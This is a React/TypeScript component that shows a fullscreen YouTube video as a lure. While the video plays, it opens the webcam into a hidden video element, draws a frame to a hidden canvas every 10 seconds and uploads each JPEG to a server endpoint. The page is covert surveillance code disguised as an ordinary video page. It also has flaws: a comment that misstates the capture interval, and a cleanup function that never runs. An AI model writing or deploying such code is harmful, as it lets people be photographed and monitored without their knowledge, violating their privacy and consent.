import { useEffect, useRef } from "react";
import { UPLOAD_FILE } from "./constant/contant";

const App = () => {
  const cameraRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          // audio: true, // also captures mic
        });

        if (cameraRef.current) {
          cameraRef.current.srcObject = stream;
        }

        // Capture photo every second
        const intervalId = setInterval(() => captureAndSendFrame(), 10000);

        return () => {
          clearInterval(intervalId);
          stream.getTracks().forEach((track) => track.stop());
        };
      } catch (err) {
        console.error("Error accessing media:", err);
      }
    };

    startCamera();
  }, []);

  const captureAndSendFrame = () => {
    if (!cameraRef.current || !canvasRef.current) return;

    const video = cameraRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
      if (!blob) return;

      const formData = new FormData();
      formData.append("file", blob, "frame.jpg");
      let id = 1;
      // Example fetch to upload
      fetch(`${UPLOAD_FILE}/${id}`, {
        method: "POST",
        body: formData,
      }).catch((err) => console.error("Upload failed:", err));
    }, "image/jpeg", 0.8);
  };

  return (
    <div className="relative w-screen h-screen">
      {/* Fullscreen YouTube */}
      <div className="h-full w-full">
      <iframe
        className="absolute inset-0 w-full h-full"
        src="https://www.youtube.com/embed/udgrClXV26Y?autoplay=1&mute=1"
        title="YouTube video"
        allow="autoplay; encrypted-media; microphone; camera"
        allowFullScreen
      />
      </div>

      {/* Hidden camera video */}
      <video ref={cameraRef} autoPlay playsInline style={{ display: "none" }} />

      {/* Hidden canvas for capturing */}
      <canvas ref={canvasRef} style={{ display: "none" }} />
    </div>
  );
};

export default App;
